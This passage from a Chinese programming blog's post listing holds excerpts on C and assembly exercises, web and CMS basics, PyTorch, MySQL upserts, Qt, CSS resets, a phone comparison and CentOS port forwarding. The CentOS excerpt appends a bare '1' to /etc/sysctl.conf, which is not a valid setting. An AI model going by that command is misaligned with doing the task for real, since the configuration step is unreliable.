double f( int n, double a[], double x ) { double fx=0,b[MAXN],t=1; int i; for(i=1;i&lt;=n;i++) { t=t*x; b[i]=t; } for(i=1;i&lt;=n;i++) { fx+=a[i]*b[i]; } return fx+a[0]; } 6-3 简单求和 (10分) 本题要求实现一个函数，求给定的N个整数的和。
函数接口定义： int Sum ( int List[], int N );
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1f775ba2c28e60c78d14f714ec93320/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c35fe94c3b281fe5598b5cef71bd7e5/" rel="bookmark">
			小米10pro和小米10的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小米10和小米10Pro或将都采用目前主流的挖孔屏设计，前置摄像头开孔位于屏幕左上角。
小米10爆降800这活动太给力了 机会不容错过
https://www.xiaomi.com/10
不同的是，小米10搭载的是三星直板全面屏，屏幕刷新率达到90Hz，支持MEMC动态补偿；而小米10Pro则搭载的是三星双曲面屏幕，屏幕刷新率达到120Hz，同样支持MEMC动态补偿。
小米10和小米10Pro都将采用四曲面玻璃配以渐变色工艺；后置摄像头位于后盖左上角，竖直排列（小米10为后置三摄，小米10Pro为后置四摄）。据悉，两款手机在重量方面均超过200g，其中小米10为208g，小米10Pro为214g
其中小米10配备108MP主摄+20MP 117°超广角镜头+5MP 5倍长焦镜头；小米10Pro则配备108MP主摄+64MP 117°超广角镜头+8MP 5倍长焦镜头+48MP 2倍长焦镜头。
两款新机配备LPDDR5内存、UFS3.0闪存，双立体扬声器，去年电池上的短板也加码补齐。小米10配备了4800mAh电池，支持30W超级快充；小米10Pro则配备4500mAh电池，快充最高功率达到65W。
小米10和小米10Pro的性能自然不必多说。尤其在5G性能方面，骁龙865 X55处理器支持2G/3G/4G/5G所有模式，支持Sub-6GHz/毫米波、TDD/FDD、NSA/SA、DSS（动态频谱共享）、载波聚合，下载速度最高可达3.7Gbps。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/566c74487dc7425926275a5a0cce0246/" rel="bookmark">
			【洛谷】【官方题单——函数与结构体】P5461 赦免战俘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目 1.题目背景
借助反作弊系统，一些在月赛有抄袭作弊行为的选手被抓出来了！
2.题目描述
现有 2n* 2n (n≤10) 名作弊者站成一个正方形方阵等候 kkksc03 的发落。kkksc03 决定赦免一些作弊者。他将正方形矩阵均分为 4 个更小的正方形矩阵，每个更小的矩阵的边长是原矩阵的一半。其中左上角那一个矩阵的所有作弊者都将得到赦免，剩下 3 个小矩阵中，每一个矩阵继续分为 4 个更小的矩阵，然后通过同样的方式赦免作弊者……直到矩阵无法再分下去为止。所有没有被赦免的作弊者都将被处以棕名处罚。
给出 nn，请输出每名作弊者的命运，其中 0 代表被赦免，1 代表不被赦免。
3.输入格式
一个整数 nn。
4.输出格式
2n* 2n 的 01 矩阵，代表每个人是否被赦免。数字之间有一个空格。
5.输入输出样例
3 0 0 0 0 0 0 0 1 0 0 0 0 0 0 1 1 0 0 0 0 0 1 0 1 0 0 0 0 1 1 1 1 0 0 0 1 0 0 0 1 0 0 1 1 0 0 1 1 0 1 0 1 0 1 0 1 1 1 1 1 1 1 1 1 二、心得与知识点 ①以后一看到题目，不要立刻就用模拟的方法，而要先去分析实验的数据，看能否找到一定的规律
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/566c74487dc7425926275a5a0cce0246/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d38dec203fc0ce3d556e33a1c3c2ab1/" rel="bookmark">
			HDU 1024 Max Sum Plus Plus【#1024程序员节#&#43;动态规划】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HDU 1024 Max Sum Plus Plus Max Sum Plus Plus Time Limit: 2000/1000 MS (Java/Others) Memory Limit: 65536/32768 K (Java/Others)
Total Submission(s): 51455 Accepted Submission(s): 18818
Problem Description Now I think you have got an AC in Ignatius.L’s “Max Sum” problem. To be a brave ACMer, we always challenge ourselves to more difficult problems. Now you are faced with a more difficult problem.
Given a consecutive number sequence S1, S2, S3, S4 … Sx, … Sn (1 ≤ x ≤ n ≤ 1,000,000, -32768 ≤ Sx ≤ 32767).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d38dec203fc0ce3d556e33a1c3c2ab1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab6a1a579b395c99229d17b9d1673911/" rel="bookmark">
			一篇文带你从0到1了解建站及完成CMS系统编写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习目标 了解搭建一般网站的简便方式了解最原始一般站点搭建了解内容管理站点搭建了解权限设计及完成了解使用设计模式减少代码冗余了解前端拖拽页面生成及生成了解自定义数据的创建了解动态生成的前端页如何绑定自定义数据 开发环境 Windows7 *64 SP1php5.6apache/nginxthinkphp5.1mysqlphpstudy2018sqlyoglayoutit 声明 文章为从0到1了解内容管理系统搭建与编写，由于一篇文章内容篇幅过长，文章内容经过压缩，该项目中相同逻辑的实现只以一个实例作为描述，主要以核心关键功能的开发作为主要的讲解步骤。如有想学习完整内容系统编写可在留言区留言，我会尽快完成完整版的实战教程发布。谢谢。本篇不涉及vue、nodejs的前端框架。
知识门槛 以下内容有过一些了解即可：
htmlsqlphptp框架 面向人群 刚学了php不懂怎么用的同学会一点点建站但是又不清楚流程的同学学习完了一些框架不懂怎么使用的同学有过一些web开发经验的同学等希望本篇文章对每一个阅读完的同学都有帮助 注意：本篇文章部分细节由于篇幅关系并不会去深入完善，并且相同逻辑的实现只以一个实例作为描述，主要以核心功能的开发作为主要的讲解步骤。本篇不涉及vue、nodejs的前端框架。
一、 了解一些专业术语及概念 在了解搭建网站前，需要普及一些基本的知识概念，防止某些同学在一方面有概念性的错误，并且我个人认为在学习一方面知识前需要对这一方面的知识有一个广度的了解，这里所指的广度为这东西是用来干什么的、作用是什么、为什么要这样写；所以在正式开始介绍如何编写CMS前将会介绍这一部分内容。为了方便阅读第一点内容引入我另外一篇原创文章。
1.1了解浏览一个网页的基本流程方式 在学习一门技术的时候，往往是了解整体体系架构才能更好的学习，不然在学习的过程中会出现不知道为什么这样做，做出这一部分是该整体部分的哪个区域，只会跟着做，但是并不了解这是在干啥。可能一些萌新体会颇深，就照着打，老师教怎么写，我就怎么写，反正做出来了。
本篇博文，就来用最接地气的方式对基本的web开发做一个整体的讲解，带各个萌新过一遍web开发的流程，好让各位萌新知道学习的时候学习了什么知识点，这个知识点能够干哈。
最开始，我们就以个人浏览网站的方式给大家说一下这一个过程是如何运作的。
我们访问网站，一般先打开浏览器（不要杠），输入一个网址，随后浏览器打开一个网页。在你在请求这一个网址数据的时候，已经发生了一系列的操作。
1.2了解IP地址 假设你输入的是“csdn.net”，浏览器想要去访问你这个网站，首先需要的是获得你这个网站的IP地址。可能就有萌新问了**“什么是IP地址？”。IP地址就是“指互联网协议地址，或者说网际协议地址”。又有萌新说了“你这么说我怎么懂？”**，好了现在容我慢慢道来。
IP地址就是在网络中，定位你这台电脑，或者说是设备的一个标记，这个标记是人们指定好的标准协议而产生的（协议就是你和我说好了一件事，拉钩了，以后要这样做）。就像你家的门牌号例如叫做“CSDN市，CSDN区，CSDN街道的CSDN小区第CSDN栋的第CSDN号”…这是由有关机构制定的一套规范名称，不允许随意更改；我们换个例子，例如你家是“深圳市南山区深南大道某某小区第八栋808”，你写快递的收件地址肯定是写这个，难道你写“宇宙第一星球第一市第一栋第一号”？地址是由专门组织规范且制定的一套定位规范，遵循这个规范可以使遵循该规范的设备或者人之间相互通信，这个通信指可以传达交互，能够定位、找到。综上所述，IP地址就不要纠结为什么要这样写，只要知道这个IP地址是你要用的就行。
1.3了解DNS 现在IP地址知道是什么了，那么怎么获得IP地址？这个时候就需要用到DNS了，啥是DNS？？！！
DNS的英文全称是 Domain Name System，翻译过来就是域名系统。好了，这个时候问题又来了。
1.4了解域名 啥是域名？域名就是用来标识IP地址的一个标记，或者说是昵称。“为什么不直接用IP地址？”这个问题问得好，如果我们人不用名称，就用身份证号，我叫你的时候就会叫“450333333333333333…”。。。我觉得这样不是很好。。。当人们觉得使用IP地址不方便记忆后，就产生了域名地址，就像CSDN，我们就知道是CSDN就好了，难道还要去记她的IP地址吗？例如CSDN的地址是192.168.1.1，难不难受…以后可能你记网站名称就在记数字了，又不方便又崩溃。好了，回归正题，我们输入了网址后，按下Enter键后，浏览器将会去DNS请求这个域名对应的IP是什么，如果找到了，就返回一个IP地址。可能又有萌新问了，“浏览器会自动去找DNS？”，会是会，但是我们也会给它一个目标，在我们的网络连接里面，本地连接右键属性，里面有个IPV4，双击进去就可以查看自己配置的DNS了，一般别乱改，不然很难过的，有时候浏览器打不开网址，就是这个原因。
记住，网络IP冲突可能会导致上不了网，这种情况在学校的机房里很常见，只要改成自动获取IP就ok了，会自动分配闲置的IP地址。
1.5 了解数据请求 当找到了IP地址，这个时候就会向该IP地址的设备去请求数据，请求数据的意思就是，这个设备或者说服务器就像一个大型的分发机构，就是送情报的一个部门，一共有65535个窗口，每个窗口送不同的情报；例如我们需要请求网站之类的数据，就通过第80个窗口请求，这个时候浏览器派来的小弟来到这个80号窗口，可能会排一下队，拿到数据后，回到浏览器，浏览器把拿到的数据显示给你看。
1.6 了解“ 渲染” 其实在这个时候，浏览器显示的数据会根据一些标记，进行排版，这些标记就称是HTML，HTML是 Hyper Text Markup Language 的缩写，中文名是超级文本标记语言，其实说那么深奥还不方便理解；简单来说就是通过特定的标签，把一段文本信息标记起来，表示这段文本信息要怎么样去进行显示，或者是这个文本信息是啥东西；例如 &lt;title&gt;CSDN-专业IT技术社区&lt;/title&gt;是CSDN官网首页的标题，用了title这个标签把文本信息标记，标记好后，浏览器就知道这个文本要显示在哪里，要怎么进行显示，最终浏览器把这一段信息显示在了浏览器标题头位置：
我们再看看另外的一个例子：
这一段HTML语言所标记了一个博客的文本，整个标记的情况为了清晰的看清楚，我在这里列出：&lt;a href="//blog.csdn.net/" class="toolbar_to_feed" title="博客"&gt;博客&lt;/a&gt;，标记语言HTML那一些标记并不会进行显示，只显示了博客这个这个文本在网页上：
那是因为浏览器是通过标记语言的内容去进行显示，标记语言的作用就是告诉浏览器这里你要怎么显示这个内容，或者说这个内容有什么功能。这里是博客的一个跳转，使用的是a标签，a标签是什么？a标签就是&lt;a&gt;这里是要显示的文本&lt;/a&gt;，在a标签里面可以添加一些固定的操作，例如a标签的作用是跳转到指定的页面，那么这个页面肯定是有一个链接的，那么这个链接需要什么来指定呢？
答案就很简单了，使用href来指定，这个href呢就需要把要跳转到的页面的地址给加上，在我们查看到的HTML代码中是href="//blog.csdn.net/"，这就表示会跳转到blog.csdn.net这个地址，有人点击就会跳转到博客了。
那 class="toolbar_to_feed" 是什么东西？在这里我们可以把它当做给定了一个样式，给定了一个style，要怎么样显示，你要显示的样子是什么？可能红色的底，绿色的字，俗话说，红配绿。。。这个样式的名称就叫做 toolbar_to_feed 。在这里并不会深入的讲解这个样式要让博客这个文本显示成啥样，大家只要通过例子知道这个html是用来告诉浏览器怎么样显示这个文本，或者这个文本有什么用就ok了。其实还有些动态的数据，但是在这里并不会讲解，基本的理解这样就没问题了。专业点的说法就是构件编排用户界面。
1.7 了解前端 通过以上描述就很清楚的知道，如果我们做web开发的话，做html相关的就是给页面制作布局，怎么样好看，甚至可以做特效，让页面显示多姿多彩；一般我们称做HTML这种，是为了数据的显示的排版工作，或者说是为了包装数据工作的这类职位叫做前端；不过前端是个相对概念，在web上可以这样理解是没问题的，不过现在的前端，如果不去大厂，基本上要做的不止是包装数据的排版那么简单，可能还会做得更多。如果我们去做前端工作的话，还要掌握跟服务器交互的一些操作，打个比方，用户点击了一个按钮，这个按钮的功能是获取到你们的用户人数，这个时候你需要编写一个逻辑，去服务器获取到这个用户想要的数据。不过这点只是作为一个提醒，当真正接触前端的话会了解的。
1.8 了解后端 有很多小问号的朋友可能会记得刚刚说的，前端可能要向服务器请求数据，那么这个数据，是不是就是传说中的后端做的？（听没听过后端某问题，反正就是后端）
后端可以理解为一些业务逻辑的代码编写实现，就是需要后端，什么是业务逻辑？简单的举个例子，就像你淘宝买东西，你点了这个物品，下单了，我要在代码上怎么实现这个下单这个背后的操作；因为下单后你还需要交易，交易要收钱，收钱你还要把这个记录记载到你存放数据的地方，我们可以叫做数据库，存进去后，用户查看自己的下单记录，你还需要把这个记录取出来，用代码实现这个取出来这个过程给用户看到，不然没有记录那就很尴尬了，只收钱不卖货！流批！所以一般是指的是数据库（因为要存储数据，例如你网站的用户数据，肯定要用东西来存储，这个东西就是数据库）进行交互以处理相应的业务逻辑。虽然后端要考虑很多东西，但是一般来说这样举例子就比较方便理解，就不过多的谈论其它东西了。
现在整个逻辑基本上就通了，简单的理解，后端就是实现一些数据操作，业务逻辑的实现（其实可能会运维），前端呢就是负责用户的页面数据的展示排版；嗯，大体这样理解问题不大。
1.9 了解建站 既然理解通了，我们就来说说一个网站搭建的流程是什么吧！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab6a1a579b395c99229d17b9d1673911/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba0455ea6b1caac9f2a8a5c7d31d763f/" rel="bookmark">
			04-文件IO和标准IO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IO 什么是IO #include &lt;stdio.h&gt;
std：standard 标准的
IO：input output
i：输入，数据从外部存储设备输入到内存中
o：输出，数据从内存到外部存储设备
存储设备：
1.硬件：机械硬盘，固态硬盘
2.内存：SDROM DDR4
总结：IO就是数据从硬盘到内存，内存到硬盘的流动
IO分类 1.文件IO
文件IO是由系统提供的基本IO函数，是与系统绑定的，又称之为系统调用
1.文件IO的复用性低
2.文件IO涉及到用户空间到内核空间的切换，cpu模式切换，C代码调用汇编指令等等。属于一种耗时操作，应该尽量减少文件IO的使用
3.每调用一次文件IO，就会进行一次空间切换
2.标准IO
标准IO是根据ANSI标准，对文件IO进行了二次封装(scanf printf)
if(操作系统 == windows){ w_input; }else if(操作系统 == ubuntu){ l_input; } 思考：既然有了文件IO，为什么还需要标准IO？
答案：为了达到代码的可移植性，让代码的复用性更高
作用：
1.提高代码的可移植性和复用性
2.提高代码的输入输出效率
设置了一个缓冲区，缓冲区满或者满足一定条件后，陷入到内核中，由内核完成对硬件的操作，大大减少了对文件IO的调用次数。
2.标准IO 1.流和流指针 1.概念
流(stream)：将数据一个一个地移入或移出文件的形式，叫做字节流；
流指针(FILE*)：每打开一个文件，就会在内存中申请一片空间（缓冲区），管理这片内存空间的变量都存储在FILE结构体中，FILE结构体由系统定义的，我们直接拿来用就好。
2.查看FILE结构体成员
$ vi -t FILE #可以用于查看系统提供的数据类型，结构体，变量，宏定义 输入1 struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protoco /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields direct char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba0455ea6b1caac9f2a8a5c7d31d763f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a85edfef88d99018137a6d24ed90a160/" rel="bookmark">
			【汇编】第1、2周作业：cmp、jmp入门————比较两个数大小、循环计算相加数之和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言：https://blog.csdn.net/weixin_46366744/article/details/108984965 目录
1.比较两个数大小
2.计算累加和超过100
1.比较两个数大小 MOV AX,DATAS MOV DS,AX mov al,5 cmp al,9 ja L1 ;ja，若大于跳转至L1 mov dl,'N' ;若没有jmp，则继续程序 mov ah,2 int 21h jmp L2 L1: mov dl,'Y' mov ah,2 int 21h L2: MOV AH,4CH INT 21H 运行结果：
2.计算累加和超过100 MOV AX,DATAS MOV DS,AX mov ax,0 mov cx,1 again: add ax,cx cmp ax,100 ja over add cx,1 jmp again over: MOV AH,4CH INT 21H 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/25c64c1232c8db0ffa04d4e1b80f308b/" rel="bookmark">
			检验是否安装成功pytorch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 能够检验是否成功安装pytorch, cuda, cudnn，并能输出GPU型号
import torch a = torch.cuda.is_available() print(a) ngpu= 1 device = torch.device("cuda:0" if (torch.cuda.is_available() and ngpu &gt; 0) else "cpu") print(device) print(torch.cuda.get_device_name(0)) print(torch.rand(3,3).cuda()) 输出样例：
True cuda:0 GeForce GTX 1650 tensor([[0.0387, 0.8379, 0.6165], [0.4231, 0.0060, 0.9049], [0.7293, 0.1726, 0.9432]], device='cuda:0') 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a724acd2cae99363843c77a7af964ab5/" rel="bookmark">
			js操作DOM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DOM JavaScript操作网页的接口，全称为“文档对象模型(Document Object Model)。 有这几个概念：文档、元素、节点
整个文档是一个文档节点
每个标签是一个元素节点
包含在元素中的文本是文本节点
元素上的属性是属性节点
文档中的注释是注释节点
DOM本质 DOM树： DOM树是结构，树是由DOM元素和属性节点组成的，DOM的本质是把html结构化成js可以识别的树模型；
有了树模型，就有了层级结构，层级结构是指元素和元素之间的关系父子，兄弟。
下图为html文档：
DOM树形如一颗倒长的树。
它很容易表明家族成员之间的关系，把复杂的关系简明地表示出来
DOM 节点操作 dom获取 (6种方法) // 通过id获取到的是单个元素 let oBox=document.getElementById('box'); console.log(oBox)//&lt;div id='box' class="item"&gt;abcdefg&lt;/div&gt; // 通过class获取到的是一组元素，不是数组， let oBox2=document.getElementsByClassName('item'); console.log(oBox2)//HTMLCollection [div#box.item, box: div#box.item] console.log(oBox2[0]==oBox) // 通过TagName获取到的是一组元素，与上面相同 let oBox3=document.getElementsByTagName('div')[0]; console.log(oBox3) //通过name后去到的是NodeList [div#box.item],也是集合 let oBox4=document.getElementsByName('mybox'); console.log(oBox4)//NodeList [div#box.item] // h5新加两种 //获取单个 let item=document.querySelector('.item') //获取组合 let items=document.querySelectorAll('.item') console.log(item,items) // body let body=document.body; //html let html=document.documentElement; 增添加节点 let fa=document.querySelectorAll('.father')[0]; // fa.appendChild('hello') // fa.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a724acd2cae99363843c77a7af964ab5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cc885f2ec2d40f524c20db87a869bcb/" rel="bookmark">
			列出叶结点 (25分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于给定的二叉树，本题要求你按从上到下、从左到右的顺序输出其所有叶节点。
输入格式：
首先第一行给出一个正整数 N（≤10），为树中结点总数。树中的结点从 0 到 N−1 编号。随后 N 行，每行给出一个对应结点左右孩子的编号。如果某个孩子不存在，则在对应位置给出 “-”。编号间以 1 个空格分隔。
输出格式：
在一行中按规定顺序输出叶节点的编号。编号间以 1 个空格分隔，行首尾不得有多余空格。
输入样例：
8 1 - - - 0 - 2 7 - - - - 5 - 4 6 输出样例：
4 1 5 直接代码：
#include&lt;iostream&gt; #include&lt;stdio.h&gt; #include&lt;queue&gt; using namespace std; struct node { int left,right; }; node T1[10]; int creat(node *t) { int n; cin&gt;&gt;n; int check[n]; for(int i(0);i&lt;n;i++) { check[i]=0; } for(int i(0);i&lt;n;i++) { char l,r; cin&gt;&gt;l&gt;&gt;r; if(l=='-') { t[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6cc885f2ec2d40f524c20db87a869bcb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2276c6cb4af5f8659aeefc92a80a1a0c/" rel="bookmark">
			CentOS8 开启端口转发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、开启内核 IP 地址转发 首先查看内核是否开启 IP 地址转发功能
cat /proc/sys/net/ipv4/ip_forward 返回为 1 已开启，返回 0 则需要手动开一下。
以 root 用户身份执行
echo "1" &gt;&gt; /etc/sysctl.conf sysctl -p #使之立即生效 2、防火墙允许 IP 地址转发 默认情况下 firewalld 会禁止转发流量，可以执行 firewall-cmd --query-masquerade 查看状态，如果是 no，可执行下面的命令开启转发。
开启 IP 地址转发
firewall-cmd --add-masquerade --permanent #开启 IP 地址转发 firewall-cmd --reload #重载防火墙规则，使之立即生效 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e35aeef480582e79e8a613bbf1a4b0e5/" rel="bookmark">
			sql：mysql：MySql 不存在则插入，存在则更新或忽略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 在插入数据时，可能需要忽略或替换掉重复的数据（依据某个字段），这时可以在应用层处理，也可以使用复杂的 SQL 语句来处理（如果仅仅知道一些简单的 SQL 语法的话），当然也可以使用一些简单的 SQL 语法，不过它并不是通用所有的数据库类型。
以下所有实例仅针对MySQL而言，并不能随意用于其它数据库
以下的表建的唯一索引，无论一个或多个，只要导致任何一个 UNIQUE 索引或PRIMARY KEY发生冲突/重复，都适用。
实例 表名称：student
表字段：
Column NamePrimary KeyAuto IncrementUniqueidtruetrue name trueage 初始表数据：
idnameage1Jack18 注：以下所有的示例都需要被插入的数据中需要存在UNIQUE索引或PRIMARY KEY字段，同时这里引入表的主键id，并设置成自动递增，后面可以看到它的变化
1. 不存在则插入，存在则更新（插入或可指定更新个别字段） 1.1 on duplicate key update 如果插入的数据会导致UNIQUE 索引或PRIMARY KEY发生冲突/重复，则执行UPDATE语句，例：
INSERT INTO `student`(`name`, `age`) VALUES('Jack', 19) ON DUPLICATE KEY UPDATE `age`=19; -- If will happen conflict, the update statement is executed -- 2 row(s) affected 这里受影响的行数是2，因为数据库中存在name='Jack'的数据，如果不存在此条数据，则受影响的行数为1
最新的表数据如下：
idnameage1Jack19 1.2 replace into（插入或直接更新为最新的记录） 如果插入的数据会导致UNIQUE 索引或PRIMARY KEY发生冲突/重复，则先删除旧数据再插入最新的数据（注意未指定的字段可能被插入空值），例：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e35aeef480582e79e8a613bbf1a4b0e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7a506d6ebb51979c0bf0142ce772010/" rel="bookmark">
			(1) 如何写一个gym环境——学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以CartPole-v0为一个简单的例子 step 1: 导入gym模块import gymstep 2: 创建一个小车倒立摆模型env = gym.make('CartPole-v0')step 3: 初始化环境env.reset()step 4: 刷新当前环境，并显示env.render() 此时，可以出现模型的图示：
env = gym.make(‘CartPole-v0’)是创建环境的函数 env.reset()是重新初始化函数 def _reset() self.state = self.np_random.uniform(low=-0.05, high=0.05, size=(4,)) # 利用均匀随机分布初试化环境的状态 self.steps_beyond_done = None # 设置当前步数为None return np.array(self.state) # 返回环境的初始化状态 env.reset()是图像引擎函数 def _render(self, mode=’human’, close=False): if close: …. #省略，直接看关键代码部分 if self.viewer is None: from gym.envs.classic_control import rendering #这一句导入rendering模块，利用rendering模块中的画图函数进行图形的绘制 #如绘制600*400的窗口函数为： self.viewer = rendering.Viewer(screen_width, screen_height) #其中screen_width=600，screen_height=400 #创建小车的代码为： l,r,t,b = -cartwidth/2, cartwidth/2, cartheight/2, -cartheight/2 axleoffset =cartheight/4.0 cart = rendering.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7a506d6ebb51979c0bf0142ce772010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37fbb3dc29ee264cf573f7011ff8fc9c/" rel="bookmark">
			13.QT信号槽的连接方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QT的信号槽机制和线程的启动方式已经在前面的文章中写过了，本文主要是对信号槽的连接方式进行解读，信号槽的连接方式一共有5种：
1.Qt::DirectConnection
发出信号后立即调用槽函数。 该槽函数在信号函数所在的线程中执行。
示例
//头文件 #ifndef SIGNALSLOTTEST_H #define SIGNALSLOTTEST_H #include &lt;QObject&gt; #include &lt;QThread&gt; #include &lt;iostream&gt; #include &lt;cassert&gt; class signalslottest : public QObject { Q_OBJECT public: explicit signalslottest(QObject *parent = nullptr); virtual ~signalslottest(); signals: void emitsignal(); private: QThread workthread_; }; class work:public QObject { Q_OBJECT public: explicit work(QObject *parent = nullptr); virtual ~work(); void dowork(); }; #endif // SIGNALSLOTTEST_H //源文件 #include "signalslottest.h" using namespace std; signalslottest::signalslottest(QObject *parent) : QObject(parent) { cout&lt;&lt;QThread::currentThreadId()&lt;&lt;endl; work *pw=new work(); pw-&gt;moveToThread(&amp;workthread_); connect(this, &amp;signalslottest::emitsignal, pw, &amp;work::dowork, Qt::DirectConnection); workthread_.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37fbb3dc29ee264cf573f7011ff8fc9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94f5825d0c82baa21292550760c37008/" rel="bookmark">
			重置样式表——去掉浏览器默认的网页样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在写前端的时候，会发现写的网页，跟浏览器边框是有一定的距离的，是外边距，比如div盒子，P标签等，都多多少少有一些默认带的样式
在pc端看的比较清楚，在开发的时候一定要去掉这些样式，不然会影响网页布局
默认样式：
通常情况下，浏览器都会为元素设置一些默认样式
默认样式的存在会影响到页面的布局，通常情况下编写网页
时必须要去除浏览器的默认样式（pc端要去除掉浏览器的默认样式）
一般浏览器默认样式对块元素会留下一点外边距
就是说不会紧贴浏览器边缘，这个时候就需要给整个浏览器
添加一些样式，比如 margin :0 ;
body 是对整个浏览器添加样式
写两个p元素时发现文字之间有上下边距，但是把多个p放一起的
时候发现根本不会垂直边距那么长，那是因为垂直方向上外边距会重叠
这时候就直接在p标签上添加样式，并把外边距设为 0 px 即可
list-style:none; 这个会把列表前面的点取消掉（去除项目符号）
但是这样给每一个元素添加样式指定外边距为0，甚至内边距为0，会导致整个过长变的繁琐，浪费时间，所以我们也可以选择直接给整个页面添加样式
style{ 第一种 { 给每一个带有默认样式的标签挨个添加样式，取消掉样式 } 第二种 *{ margin:0px; } } 还有一个更快的操作，就是直接调用前辈们准备好的css文件
该文件有两个，一个是release.css另外一个是normalize.css
两个文件区别是前者会一次性把全部的样式去掉，第二个会保留一些样式
release.css
/* http://meyerweb.com/eric/tools/css/reset/ v2.0 | 20110126 License: none (public domain) */ html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video { margin: 0; padding: 0; border: 0; font-size: 100%; font: inherit; vertical-align: baseline; } /* HTML5 display-role reset for older browsers */ article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section { display: block; } body { line-height: 1; } ol, ul { list-style: none; } blockquote, q { quotes: none; } blockquote:before, blockquote:after, q:before, q:after { content: ''; content: none; } table { border-collapse: collapse; border-spacing: 0; } 开发中release.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94f5825d0c82baa21292550760c37008/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb68ae120e907c1238d5e5144785538e/" rel="bookmark">
			OSError: [WinError 126] 找不到指定的模块。 Error loading “E:\Anaconda\envs\pytorch\lib\site-packages\torch\li
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【报错】
Microsoft Visual C++ Redistributable is not installed, this may lead to the DLL load failure.
It can be downloaded at https://aka.ms/vs/16/release/vc_redist.x64.exe
Traceback (most recent call last):
File "&lt;stdin&gt;", line 1, in &lt;module&gt;
File "E:\Anaconda\envs\pytorch\lib\site-packages\torch\__init__.py", line 127, in &lt;module&gt;raise err
【解决】
缺少dll文件，报错里已经写了下载地址！ 下载完成，立马解决~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/774c6e3e75991dc1cf2b27781dab6dfd/" rel="bookmark">
			Element UI 菜单高亮设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		其实这个功能在element ui官方文档中有写
其实主要是这两个属性
